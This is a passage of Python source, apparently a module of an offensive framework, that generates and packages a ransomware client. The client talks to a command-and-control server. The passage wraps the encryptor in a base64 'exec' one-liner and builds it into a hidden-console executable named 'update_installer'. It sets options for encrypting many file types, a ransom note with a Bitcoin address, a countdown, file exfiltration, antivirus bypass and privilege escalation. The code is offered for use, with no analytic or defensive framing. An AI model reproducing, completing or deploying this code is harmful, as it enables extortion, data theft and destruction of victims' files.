        kill_btn.pack(side='left', padx=5)
        
        root.mainloop()
    
    except Exception as e:
        print("[!] GUI error: " + str(e))
        main()

# ==================== MAIN ====================
def main():
    print("[*] LazyRansom C2 Client v2.0")
    print("[*] C2 Server: " + C2_HOST + ":" + str(C2_PORT))
    print("[*] OS: " + OS)
    print("[*] Algorithm: " + ENCRYPTION + " (256-bit)")
    print("[*] Decryption Key: " + DECRYPT_KEY)
    
    av_bypass_techniques()
    
    client = C2Client(C2_HOST, C2_PORT)
    if not client.connect():
        print("[!] Could not connect to C2, waiting and retrying...")
        time.sleep(5)
        if not client.connect():
            print("[!] Failed to connect, running in standalone mode")
            if USE_GUI:
                try:
                    create_gui()
                    return
                except:
                    pass
    
    if USE_GUI:
        try:
            create_gui()
        except:
            pass
    
    client.listen()

if __name__ == "__main__":
    main()
'''

        b64_payload = base64.b64encode(encryptor_script.encode()).decode()
        final_payload = 'python3 -c "import base64; exec(base64.b64decode(\'{0}\').decode())"'.format(b64_payload)

        return {
            "python": final_payload,
            "base64": b64_payload,
            "script": encryptor_script,
            "decrypt_key": decrypt_key
        }

    @staticmethod
    def build_exe(payload_script, exe_name="update_installer", icon_path=None, output_dir=None, target_os="all"):
        """Build EXE for target OS with proper error handling"""
        # ===== FIX: Bypass root check untuk PyInstaller =====
        os.environ['PYINSTALLER_NO_ROOT'] = '1'
        os.environ['PYI_NO_ROOT'] = '1'

        if output_dir is None:
            output_dir = str(Path.home() / "lazyframework_payloads")

        try:
            import PyInstaller
        except ImportError:
            return None, "PyInstaller not installed. Install: pip install pyinstaller"

        try:
            temp_dir = Path.home() / ".lazyframework" / "temp"
            if temp_dir.exists():
                shutil.rmtree(temp_dir, ignore_errors=True)
            temp_dir.mkdir(parents=True, exist_ok=True)

            script_path = temp_dir / "payload.py"
            with open(script_path, 'w', encoding='utf-8') as f:
                f.write(payload_script)

            icon_arg = None
            if icon_path and os.path.exists(icon_path):
                icon_arg = icon_path
            else:
                try:
                    icon_file = temp_dir / "icon.ico"
                    with open(icon_file, 'wb') as f:
                        f.write(b'\x00\x00\x01\x00\x01\x00\x10\x10\x00\x00\x00\x00\x00\x00\x00\x00')
                    icon_arg = str(icon_file)
                except:
                    icon_arg = None

            build_output_dir = temp_dir / "dist"
            build_dir = temp_dir / "build"
            spec_dir = temp_dir

            if build_output_dir.exists():
                shutil.rmtree(build_output_dir, ignore_errors=True)
            if build_dir.exists():
                shutil.rmtree(build_dir, ignore_errors=True)

            # ===== FIX: Platform-specific PyInstaller flags =====
            # Deteksi OS saat build time
            import platform as plat
            current_os = plat.system().lower()
            
            cmd = [
                sys.executable, "-m", "PyInstaller",
                "--onefile",
                "--noconsole",
                "--name", exe_name,
                "--distpath", str(build_output_dir),
                "--workpath", str(build_dir),
                "--specpath", str(spec_dir),
                "--log-level", "WARN",
                "--hidden-import=pycryptodome",
                "--hidden-import=Crypto",
            ]

            # ===== FIX: Platform-specific flags (tanpa --target-os yang invalid) =====
            # PyInstaller builds untuk OS dimana dia dijalankan, bukan cross-platform
            if current_os == "darwin":
                # MacOS: PyInstaller menghasilkan .app bundle
                cmd.extend(["--osx-bundle-identifier", "com.lazyframework.ransomware"])
            elif current_os == "windows":
                # Windows: gunakan windows specific options jika perlu
                pass
            # Linux: default PyInstaller config sudah cukup

            if icon_arg and os.path.exists(icon_arg):
                cmd.extend(["--icon", icon_arg])

            cmd.append(str(script_path))

            print(f"[*] PyInstaller command: {' '.join(cmd)}")
            print(f"[*] Target OS: {target_os}")
            print(f"[*] Output name: {exe_name}")

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                cwd=str(temp_dir),
                timeout=300
            )

            if result.returncode == 0:
                exe_file = None

                # ===== FIX: Cari file yang dihasilkan =====
                if build_output_dir.exists():
                    # Cari file dengan nama yang sesuai
                    for f in build_output_dir.iterdir():
                        if f.is_file():
                            exe_file = f
                            break
                        # Untuk macOS, cari .app bundle
                        if f.is_dir() and f.suffix == '.app':
                            exe_file = f
                            break

                    # Jika tidak ditemukan, coba dengan nama yang diharapkan
                    if not exe_file:
                        import platform as plat
                        current_os = plat.system().lower()
                        expected_names = []
                        
                        if current_os == "windows":
                            expected_names = [f"{exe_name}.exe"]
                        elif current_os == "darwin":
                            expected_names = [f"{exe_name}.app", exe_name]
                        else:
                            # Linux: PyInstaller menghasilkan file tanpa extension
                            expected_names = [exe_name]
                        
                        for name in expected_names:
                            test_file = build_output_dir / name
                            if test_file.exists():
                                exe_file = test_file
                                break

                if exe_file and exe_file.exists():
                    output_path = Path(output_dir)
                    output_path.mkdir(parents=True, exist_ok=True)

                    # ===== FIX: Tentukan nama file akhir sesuai OS saat build =====
                    import platform as plat
                    current_os = plat.system().lower()
                    
                    if current_os == "windows":
                        final_name = exe_name + '.exe'
                    elif current_os == "darwin":
                        # MacOS: PyInstaller menghasilkan .app bundle
                        if exe_file.is_dir() and exe_file.suffix == '.app':
                            final_name = exe_name + '.app'
                        else:
                            final_name = exe_name
                    else:
                        # Linux: tanpa ekstensi (binary executable)
                        final_name = exe_name

                    final_file = output_path / final_name
                    shutil.copy2(exe_file, final_file)
                    os.chmod(final_file, 0o755)
                    
                    print(f"[+] Built: {final_file}")
                    print(f"[+] Size: {os.path.getsize(final_file):,} bytes")
                    return str(final_file), None
                else:
                    # ===== FIX: Debug output =====
                    print(f"[!] Build output dir: {build_output_dir}")
                    if build_output_dir.exists():
                        print(f"[!] Contents: {list(build_output_dir.iterdir())}")
                    return None, f"Executable not found in {build_output_dir}"
            else:
                error_msg = result.stderr if result.stderr else result.stdout
                print(f"[!] PyInstaller error: {error_msg[:500]}")
                return None, f"PyInstaller error: {error_msg[:500] if error_msg else 'Unknown error'}"

        except subprocess.TimeoutExpired:
            return None, "Build timeout (300s)"
        except Exception as e:
            return None, f"Build error: {str(e)}"


def run(session, options):
    """Main module execution"""
    lhost = options.get("LHOST", "127.0.0.1")
    lport = int(options.get("LPORT", 4444))
    encryption = options.get("ENCRYPTION", "xchacha20")
    extensions = options.get("EXTENSIONS", "txt,doc,docx,pdf,jpg,png,xls,xlsx,ppt,pptx,zip,rar,7z,db,sql,py,js,html,css,json,xml,csv")
    ransom_note = options.get("RANSOM_NOTE", "YOUR FILES ARE ENCRYPTED!\\nSend BTC to address...")
    btc_address = options.get("BTC_ADDRESS", "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
    wallpaper = str(options.get("WALLPAPER", True)).lower() == "true"
    countdown = int(options.get("COUNTDOWN_SECONDS", 300))
    exfiltrate = str(options.get("EXFILTRATE_FILES", True)).lower() == "true"
    max_size = int(options.get("MAX_FILE_SIZE_MB", 10))
    use_gui = str(options.get("GUI_MODE", True)).lower() == "true"
    decrypt_key = options.get("DECRYPT_KEY", "")
    av_bypass = str(options.get("AV_BYPASS", True)).lower() == "true"
    privilege_esc = str(options.get("PRIVILEGE_ESCALATION", True)).lower() == "true"
    parallel = str(options.get("PARALLEL_ENCRYPTION", True)).lower() == "true"
    thread_count = int(options.get("THREAD_COUNT", 4))
    target_os = options.get("TARGET_OS", "all")

    print(f"""
╔══════════════════════════════════════════════════════════════════╗
║           LAZYFRAMEWORK RANSOMWARE C2 CLIENT v2.0              ║
║              XChaCha20-Poly1305 256-bit Encryption              ║
╠══════════════════════════════════════════════════════════════════╣
║  LHOST             : {lhost}
║  LPORT             : {lport}
║  ENCRYPTION        : {encryption} (256-bit)
║  BTC_ADDRESS       : {btc_address}
║  WALLPAPER         : {str(wallpaper)}
║  COUNTDOWN         : {countdown}s
║  GUI_MODE          : {str(use_gui)}
║  TARGET_OS         : {target_os}
║  DECRYPT_KEY       : {decrypt_key if decrypt_key else 'Auto-generated'}
║  THREAD_COUNT      : {thread_count}
╚══════════════════════════════════════════════════════════════════╝
""")

    builder = RansomwareBuilder()
    result = builder.generate_payload(
        lhost, lport, encryption, extensions, ransom_note, btc_address, wallpaper,
        countdown, exfiltrate, max_size, use_gui, decrypt_key,
        av_bypass, privilege_esc, parallel, thread_count, target_os
    )

    print("\n[+] RANSOMWARE C2 CLIENT GENERATED")
    print("="*50)
    print(f"\n Algorithm: {encryption.upper()} (256-bit)")
    print(f" Decryption Key: {result['decrypt_key']}")
    print("\n[Python Payload]")
    print(result["python"][:500] + "...")
    print("\n" + "="*50)

    return result["python"]